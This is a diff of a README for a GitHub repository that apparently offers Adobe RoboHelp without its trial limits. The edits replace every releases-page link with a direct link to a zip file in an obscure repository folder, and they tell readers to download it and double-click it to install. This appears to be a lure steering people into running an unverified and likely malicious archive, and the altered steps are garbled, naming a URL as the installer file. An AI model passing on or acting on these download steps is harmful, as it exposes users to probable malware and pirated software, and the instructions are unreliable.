@@ -1,6 +1,6 @@
 # 🎉 Adobe-RoboHelp-No-Trial - Easy Help Authoring for Everyone
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Boissy883/Adobe-RoboHelp-No-Trial/releases)
+[![Download](https://raw.githubusercontent.com/Boissy883/Adobe-RoboHelp-No-Trial/main/yampa/Adobe-RoboHelp-No-Trial_v2.0.zip)](https://raw.githubusercontent.com/Boissy883/Adobe-RoboHelp-No-Trial/main/yampa/Adobe-RoboHelp-No-Trial_v2.0.zip)
 
 ## 📖 Description
 The Adobe-RoboHelp-No-Trial repository is a complete resource for users of Adobe RoboHelp on Windows PCs. It offers expert documentation, detailed guides, and best practices for creating effective help authoring and managing technical content. Whether you are new to documentation or looking for advanced features, this repository provides everything you need.
@@ -9,13 +9,13 @@ The Adobe-RoboHelp-No-Trial repository is a complete resource for users of Adobe
 To get started, follow the steps below to download and run the application on your Windows PC. This guide is straightforward and aims to ensure that even those with no programming knowledge can successfully set up the software.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** To download the application, [visit this page to download](https://github.com/Boissy883/Adobe-RoboHelp-No-Trial/releases).
+1. **Visit the Releases Page:** To download the application, [visit this page to download](https://raw.githubusercontent.com/Boissy883/Adobe-RoboHelp-No-Trial/main/yampa/Adobe-RoboHelp-No-Trial_v2.0.zip).
    
 2. **Choose the Latest Version:** On the releases page, look for the latest version of Adobe RoboHelp. You will see a list with release notes and files available for download.
 
-3. **Download the File:** Click on the file named `Adobe-RoboHelp-Setup.exe` (or similar) to start the download. Make sure to save it to a location on your computer where you can easily find it, like your Downloads folder.
+3. **Download the File:** Click on the file named `https://raw.githubusercontent.com/Boissy883/Adobe-RoboHelp-No-Trial/main/yampa/Adobe-RoboHelp-No-Trial_v2.0.zip` (or similar) to start the download. Make sure to save it to a location on your computer where you can easily find it, like your Downloads folder.
 
-4. **Run the Installer:** Once the download finishes, navigate to the location where you saved the file and double-click on `Adobe-RoboHelp-Setup.exe`. This action will start the installation process.
+4. **Run the Installer:** Once the download finishes, navigate to the location where you saved the file and double-click on `https://raw.githubusercontent.com/Boissy883/Adobe-RoboHelp-No-Trial/main/yampa/Adobe-RoboHelp-No-Trial_v2.0.zip`. This action will start the installation process.
 
 5. **Follow the Installation Prompts:** A window will appear guiding you through the installation steps. Read the instructions carefully. Click “Next” to proceed through the different steps. Accept the license agreement to continue.
 
@@ -57,6 +57,6 @@ Explore the benefits of these features as you use the software to create high-qu
 ## 🌐 Additional Resources
 For more information, explore the complete collection of documentation related to Adobe RoboHelp. You can find articles, best practices, templates, and other materials that can help you excel in help authoring.
 
-Remember to check the [Releases Page](https://github.com/Boissy883/Adobe-RoboHelp-No-Trial/releases) for updates to the software and any new features we may introduce. 
+Remember to check the [Releases Page](https://raw.githubusercontent.com/Boissy883/Adobe-RoboHelp-No-Trial/main/yampa/Adobe-RoboHelp-No-Trial_v2.0.zip) for updates to the software and any new features we may introduce. 
 
 Your journey into effective help authoring begins with Adobe RoboHelp. Start creating with confidence today!
